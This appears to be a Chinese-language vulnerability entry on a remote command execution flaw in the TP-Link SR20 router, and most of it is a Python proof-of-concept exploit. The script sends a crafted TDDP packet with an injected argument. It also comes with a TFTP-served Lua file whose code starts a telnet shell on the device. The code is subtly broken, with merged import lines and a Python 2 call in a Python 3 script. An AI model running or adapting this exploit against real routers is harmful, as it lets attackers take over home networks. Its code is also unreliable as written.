# TP-Link SR20 远程命令执行

## 漏洞描述

据外媒报道，著名安全专家、Google 安全工程师Matthew Garrett公开了TP-LINK SR20智能家居路由器一个“允许来自本地网络连接的任意命令执行”的漏洞。攻击者可通过该漏洞控制用户路由器，借此执行任意命令，危及用户隐私安全。

## 漏洞影响

```
TP-Link SR20
```

## 漏洞POC

```python
#!/usr/bin/python3
# Create /testfile in your tftp root directory with the followingcontents:
#function config_test(config)
# os.execute("telnetd -l/bin/login.sh")
#end
# Replace 192.168.0.1 with the IP address of the vulnerable device
importbinascii
importsocket
port_send = 1040
port_receive = 61000
tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X"% 00
tddp_packet = "".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding])
sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind(( '', port_receive))

# Send a request
sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
packet = packet + b"/testfile;arbitrary"
print(packet)
sock_send.sendto(packet, ( "192.168.0.1", port_send))
sock_send.close()
response, addr = sock_receive.recvfrom( 1024)
r = response.encode( 'hex')
print(r)
```